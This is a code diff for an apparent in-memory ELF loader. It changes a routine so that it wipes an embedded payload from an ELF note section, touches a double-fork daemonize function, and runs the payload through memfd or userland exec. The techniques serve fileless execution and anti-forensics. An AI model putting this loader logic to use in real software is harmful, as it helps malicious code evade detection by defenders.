@@ -34,34 +34,43 @@ bool get_psection_data(ELFIO::elfio &reader,
     return found;
 }
 
-void set_psection_data(ELFIO::elfio &reader,
-                       unsigned int psec_num,
-                       Elf_Word p_data_sz, const char * dst_elf_file) {
+void clean_psection_data( unsigned int psec_num, const char * dst_elf_file) {
     Elf_Word type;
     std::string name;
-    bool found = FALSE;
+    elfio reader;
+
+    if (!reader.load(dst_elf_file)) {
+        cerr << "Can't find or process src ELF file: " << dst_elf_file << endl;
+        exit(AFAULT);
+    }
 
     // There should be at least PSEC_NENTRY entries in section: key and algo
-    cout << "Checking psec_num: " << psec_num << endl;
     Elf_Word sec_entries_n = get_section_entries_n(reader, psec_num);
     if (sec_entries_n < PSEC_NENTRY) {
         err(EXIT_FAILURE, "ksec ix is %d, < %d", sec_entries_n, PSEC_NENTRY);
     }
+    dprint("psec_num: %d, number of entries: %d\n", psec_num, sec_entries_n);
 
     section *note_sec = reader.sections[psec_num];
+    note_section_accessor notes_reader(reader, note_sec);
     note_section_accessor notes_writer(reader, note_sec);
 
-    void * p_data = calloc(p_data_sz,sizeof(char));
-    if ( p_data == NULL) {
-        err(EXIT_FAILURE, "calloc() failed allocating %d\n", p_data_sz);
+
+    for (Elf_Word i=0; i < sec_entries_n; i++){
+        void *p_data = NULL;
+        Elf_Word p_data_sz;
+        if (notes_reader.get_note(i, type, name, p_data, p_data_sz)) {
+            void * c_data = calloc(p_data_sz,sizeof(char));
+            if ( c_data == NULL) {
+                err(EXIT_FAILURE, "calloc() failed allocating %d\n", p_data_sz);
+            }
+            note_sec->set_data( (const char*) c_data, p_data_sz);
+        }
     }
-    note_sec->set_data( (const char*) p_data, p_data_sz);
 
     if (reader.save(dst_elf_file) == TRUE) {
-        cout << "Updated " << dst_elf_file << " OK" << endl;
+        dprint("%s\n", "Updated OK");
     }
-    if ( p_data != NULL)
-        free(p_data);
 }
 
 
@@ -110,7 +119,6 @@ void daemonize(mem_exec fp, bool memfd_method, unsigned char const *p_data, char
         err(EXIT_FAILURE, "First fork() unsuccessful");
     } else if (pid != 0) {
         // after first fork() in parent. exiting by choice.
-        // TODO: clean up if any
         _exit(0);
     }
 
@@ -129,7 +137,6 @@ void daemonize(mem_exec fp, bool memfd_method, unsigned char const *p_data, char
         err(EXIT_FAILURE, "Second fork() unsuccessful");
     } else if (pid != 0) {
         // after second fork() in parent. exiting by choice.
-        // TODO: clean up if any
         _exit(0);
     }
 
@@ -164,11 +171,12 @@ Elf_Word get_section_entries_n(ELFIO::elfio &reader, unsigned int section_number
 }
 
 void load_exec(bool memfd_method, unsigned char const *p_data, char ***args) {
+
     if (memfd_method) {
-        debug_print("%s\n", "Exec via memfd");
-        reflect_mfd_execv(p_data, *args + 1);
+        dprint("Exec via memfd\n");
+        reflect_mfd_execv(p_data, *args);
     } else {
-        debug_print("%s\n", "Exec via uexec");
+        dprint("Exec via uexec\n");
         reflect_execv((unsigned char const *) p_data, *args);
     }
 }
